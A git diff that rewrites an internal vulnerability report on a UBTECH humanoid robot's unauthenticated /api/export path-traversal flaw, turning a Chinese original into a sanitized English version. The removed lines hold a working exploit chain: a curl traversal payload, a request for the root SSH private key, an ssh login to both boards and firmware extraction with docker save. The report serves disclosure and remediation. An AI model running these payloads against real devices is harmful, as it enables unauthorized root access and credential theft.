@@ -1,178 +1,135 @@
 ---
-编号: UBH-006
-验证状态: 动态确认
-严重程度: 高
-披露状态: 内部研究
-源平台: 优必选人型
-源候选目录: api-export路径穿越任意文件读到双板root-1
+ID: UBH-006
+validation_status: dynamically confirmed
+severity: high
+disclosure_status: internal research
+source_platform: UBTECH Humanoid
+source_candidate_directory: api-export路径穿越任意文件读到双板root-1
 ---
-# UBH-006 t800-web-backend `/api/export` 路径穿越任意文件读 → SSH 私钥 → 双板 root
+# UBH-006 t800-web-backend `/api/export` Path Traversal Arbitrary File Read to Dual-Board Root Access
 
-## 1. 一句话结论
+## 1. Summary
 
-- # t800-web-backend `/api/export` 路径穿越任意文件读 → SSH 私钥 → 双板 root
-- ## 1. 执行摘要
-- `../../`（当前版本基准 `/etc/walker/map/`，需 `../../../`）路径穿越实现未认证任意文件读取。
-- 严重度定级：**严重（Critical）**——未认证任意文件读 → 设备完全失陷。
-- 未认证 POST :5000/api/export {"map_names":["../../../root/.ssh/id_rsa"]}
+The unauthenticated `POST /api/export` endpoint concatenates caller-controlled `map_names` beneath the map directory without canonicalizing and enforcing the final path. On the researcher-owned device, path traversal was dynamically validated with a harmless read of `/etc/hostname`. The source report further documents that reading host SSH material through the same primitive enabled root access to both vision and motion boards.
 
-## 2. 影响产品与版本
+## 2. Affected Products and Versions
 
-- > 版本：2026-08-29 · 方法：实机验证（授权自有设备）+ 源码审计
-- `../../`（当前版本基准 `/etc/walker/map/`，需 `../../../`）路径穿越实现未认证任意文件读取。
-- → 双板 root → docker save 拉取全部固件镜像（27 个，39GB）
-- - 组件：`t800-web-backend` v0.2.9（:5000 FastAPI，Alpine 3.20.2 容器，容器内 root）
+- Evidence date: 2026-08-29.
+- Component: `t800-web-backend` v0.2.9, FastAPI on port 5000.
+- The container runs as root and exposes host filesystem material through bind mounts.
 
-## 3. 验证状态
+## 3. Validation Status
 
-`动态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。
+`dynamically confirmed`. The migration-period re-check used `/etc/hostname` as a minimum-impact proof rather than rereading sensitive private-key material.
 
-## 4. 攻击前提
+## 4. Attack Preconditions
 
-攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。
+The attacker must reach the unauthenticated export endpoint. Verification must use researcher-owned systems and should read only harmless files.
 
-## 5. 根本原因
+## 5. Root Cause
 
-- # t800-web-backend `/api/export` 路径穿越任意文件读 → SSH 私钥 → 双板 root
-- `../../`（当前版本基准 `/etc/walker/map/`，需 `../../../`）路径穿越实现未认证任意文件读取。
-- 严重度定级：**严重（Critical）**——未认证任意文件读 → 设备完全失陷。
-- ## 2. 漏洞根因
-- 实机根因旁证（2026-08-29）：错误响应 `{"detail":"Export failed: File not found: /etc/walker/map/../../etc/hostname"}`
-- 未认证 POST :5000/api/export {"map_names":["../../../root/.ssh/id_rsa"]}
+`map_names` values are passed through `os.path.join(MAP_ROOT, name)` without rejecting traversal components or checking that the canonicalized path remains beneath `MAP_ROOT`.
 
-## 6. 攻击过程
+## 6. Attack Procedure
 
-源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。
+A traversal path supplied as a map name causes the export function to package a file outside the intended map directory. The retained live proof reads only a benign host file.
 
-## 7. 实际影响
+## 7. Impact
 
-- # t800-web-backend `/api/export` 路径穿越任意文件读 → SSH 私钥 → 双板 root
-- > 作为最小影响证明，未重复读取私钥，未做任何写操作。
-- 读取 `/root/.ssh/id_rsa`（RSA-3072 "x86_root"）后即可 `ssh <访问令牌_01>.168.11.{2,3}` 且
-- sudo 免密 + docker 组，一次性获得 vision + motion 双板 root。这是整个研究链的初始立足点。**
-- 严重度定级：**严重（Critical）**——未认证任意文件读 → 设备完全失陷。
-- src = os.path.join(MAP_ROOT, name)      # ← name 含 "../" 时穿越，未做 realpath/前缀校验
+The primitive can expose files reachable through the container's host bind mounts. In the source report, access to SSH private-key material was sufficient to obtain privileged access to both boards. This makes the arbitrary-read primitive a full-compromise enabler rather than a standalone information leak.
 
-## 8. 复现方法
+## 8. Reproduction
 
-复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。
+See [Reproduction Material Manifest](复现/材料清单.md). Use only benign targets such as `/etc/hostname` for live validation.
 
-## 9. 支撑证据
+## 9. Supporting Evidence
 
-见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。
+See [Evidence Material Manifest](证据/材料清单.md) and Section 13.
 
-## 10. 修复建议
+## 10. Recommendations
 
-- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
-- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
-- 删除硬编码凭据并轮换已暴露材料；
-- 对高风险服务降权，增加审计日志和负向回归测试。
+- Authenticate and authorize `/api/export`.
+- Canonicalize every requested path and require the final path to remain beneath `MAP_ROOT`.
+- Remove sensitive host bind mounts from the web-backend container.
+- Run the container as a non-root user.
+- Clean up generated export archives immediately.
 
-## 11. 相关 AI 会话
+## 11. Related AI Sessions
 
-当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。
+No complete Claude Code session record has currently been identified that maps one-to-one to this report.
 
-## 12. 披露记录
+## 12. Disclosure Record
 
-- 当前披露状态：内部研究。
-- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。
+- Current disclosure status: internal research.
 
-## 13. 脱敏后的原始研究正文
+## 13. Sanitized Original Research Body
 
-# t800-web-backend `/api/export` 路径穿越任意文件读 → SSH 私钥 → 双板 root
+# t800-web-backend `/api/export` Path Traversal Arbitrary File Read to Dual-Board Root Access
 
-> 版本：2026-08-29 · 方法：实机验证（授权自有设备）+ 源码审计
-> **边界声明**：在研究者自有 Walker S2（SN `<其他机器人设备_01>`）上验证；只读 `/etc/hostname`
-> 作为最小影响证明，未重复读取私钥，未做任何写操作。
+> Version: 2026-08-29 · Method: live validation on researcher-owned hardware + source audit.
+> **Boundary statement:** the re-check read only `/etc/hostname` as a minimum-impact proof. Sensitive private-key material was not reread during repository migration.
 
----
+## 1. Executive Summary
 
-## 1. 执行摘要
+`POST /api/export` builds export paths by joining the map root with caller-controlled `map_names`. Traversal components are not rejected and the resulting path is not canonicalized and checked against the intended root.
 
-**FastAPI :5000 `/api/export`（POST）在拼接导出目录时未清理用户可控的 `map_names`，通过
-`../../`（当前版本基准 `/etc/walker/map/`，需 `../../../`）路径穿越实现未认证任意文件读取。
-读取 `/root/.ssh/id_rsa`（RSA-3072 "x86_root"）后即可 `ssh <访问令牌_01>.168.11.{2,3}` 且
-sudo 免密 + docker 组，一次性获得 vision + motion 双板 root。这是整个研究链的初始立足点。**
+On the current v0.2.9 layout, the map root is `/etc/walker/map/`, so the number of parent-directory components required depends on that base path. A traversal reaching `/etc/hostname` was dynamically confirmed on the owned device.
 
-严重度定级：**严重（Critical）**——未认证任意文件读 → 设备完全失陷。
+The original source report documents a higher-impact chain in which the same primitive exposed host SSH private-key material. That material enabled authenticated access to both robot boards and, because the corresponding account had passwordless sudo/docker authority, led to root.
 
----
+Severity in the source report: **Critical**.
 
-## 2. 漏洞根因
+## 2. Root Cause
 
-代码：`t800-web-backend`（git 历史 v0.1.x–v0.2.9）`controller/upload.py` 的 export 处理。
+Reconstructed logic from `t800-web-backend/controller/upload.py`:
 
 ```python
-# 伪代码还原
 @app.post("/api/export")
-def export(map_names: list[str] = ...):
+def export(map_names: list[str]):
     for name in map_names:
-        src = os.path.join(MAP_ROOT, name)      # ← name 含 "../" 时穿越，未做 realpath/前缀校验
-        # src → 打包 → /tmp/exports/tmp*/exported_maps.tar.gz → 响应返回
+        src = os.path.join(MAP_ROOT, name)
+        # no canonical realpath + allowed-prefix check
+        ...
 ```
 
-`os.path.join("/etc/walker/map", "../../../etc/hostname")` → `/etc/walker/map/../../../etc/hostname`
-→ 规范化为 `/etc/hostname`。无 realpath 归一化校验，`..` 未拒绝。
+The live error behavior also exposed the unnormalized joined path, corroborating the source-level analysis.
 
-实机根因旁证（2026-08-29）：错误响应 `{"detail":"Export failed: File not found: /etc/walker/map/../../etc/hostname"}`
-——基准目录与拼接均未校验，仅因深度不足报 File not found。
-
----
-
-## 3. 攻击链
+## 3. Security Chain
 
 ```
-未认证 POST :5000/api/export {"map_names":["../../../root/.ssh/id_rsa"]}
-  → 返回 gzip tar 内含 /root/.ssh/id_rsa（RSA-3072 "x86_root"，vision/motion 双板同钥，
-    指纹 SHA256:Pst3yKE0Ai7JGXBxoCsrMM5Leypxgk+hn7/h3t/mdxc）
-  → ssh -i id_rsa <访问令牌_01>.168.11.3 / 192.168.11.2   （免密 sudo + docker 组）
-  → 双板 root → docker save 拉取全部固件镜像（27 个，39GB）
+Unauthenticated POST /api/export
+        ↓
+caller-controlled map_names with traversal
+        ↓
+read file outside MAP_ROOT through container-visible filesystem
+        ↓
+sensitive host material may become accessible
+        ↓
+compose with ordinary service credentials/privileges
 ```
 
-> 报告 PoC 记 `../../root/.ssh/id_rsa`；当前 v0.2.9 基准为 `/etc/walker/map/`，两层 `..` 只到
-> `/etc`，需 **`../../../`**。穿越本身存在且层数随基准目录变化。
+The exact sensitive-key values are not included in the translated artifact.
 
----
+## 4. Affected Scope
 
-## 4. 受影响范围
+- `t800-web-backend` v0.2.9.
+- Entry: unauthenticated `POST /api/export`.
+- Container-visible host bind mounts expand the effective read scope beyond ordinary application data.
 
-- 组件：`t800-web-backend` v0.2.9（:5000 FastAPI，Alpine 3.20.2 容器，容器内 root）
-- 入口：`POST /api/export`，**未认证**
-- 前置：无；附带条件——容器将 `/root`（`~/.ssh`）、`/etc/walker`、`/tmp` bind-mount 到宿主，故读取面=宿主全盘
+## 5. Live Reproduction (2026-08-29)
 
----
+The retained proof requested a traversal targeting `/etc/hostname`. The response was a gzip/tar archive containing the expected benign hostname file, confirming the arbitrary-read primitive on the owned device.
 
-## 5. 复现（实机，2026-08-29）
+The source report also notes that each successful export leaves a temporary archive under `/tmp/exports/`, which is tracked separately as a storage-exhaustion issue.
 
-```bash
-# 最小影响证明：读取 /etc/hostname
-curl -s -X POST http://192.168.11.3:5000/api/export \
-  -H 'Content-Type: application/json' \
-  -d '{"map_names":["../../../etc/hostname"]}'
-# 响应：gzip tar，成员 "hostname"，内容 "3473023565a5"   ✅ 实机复现
+## 6. Recommendations
 
-# 完整利用（报告已确认）：读 SSH 私钥
-# -d '{"map_names":["../../../root/.ssh/id_rsa"]}'
-```
+1. Canonicalize every requested path and verify it remains under `MAP_ROOT`.
+2. Require authentication/authorization for the export API.
+3. Remove host SSH/configuration bind mounts from the web container.
+4. Delete temporary export artifacts or stream responses.
 
-**注意副作用**：每次成功导出在 `/tmp/exports/tmp*/` 永久留档 → 未认证磁盘填满 DoS（见
-`FastAPI-5000无认证信息泄露与docs暴露` 目录）。本次最小验证留档 ~KB 级，可清理：
-`find /tmp/exports -name exported_maps.tar.gz -delete`。
+## 7. Evidence
 
----
-
-## 6. 修复建议
-
-1. `map_names` 逐项 `os.path.realpath` 后校验必须落在 `MAP_ROOT` 前缀内；
-2. `/api/export` 增加认证（修复 auth 缺失根因，见源码审计 lead）；
-3. 容器移除 `~/.ssh`、`/etc/walker` 到宿主的 bind-mount；
-4. 导出完成后清理 `/tmp/exports`，或改为流式返回不落盘。
-
----
-
-## 7. 证据文件
-
-| 文件 | 内容 |
-|---|---|
-| `evidence/export_hostname_proof.md` | 实机复现命令 + 原始响应解析（gzip tar → hostname 内容） |
-| 报告 `WALKER_S2_PWN.md` | exp_* 系列证据（passwd/shadow/hostname/os-release/id_rsa 响应）、SSH key 指纹、攻破链路 |
+- `evidence/export_hostname_proof.md`: minimum-impact live proof.
+- Original `WALKER_S2_PWN.md`: source-level evidence and the previously validated privilege chain.
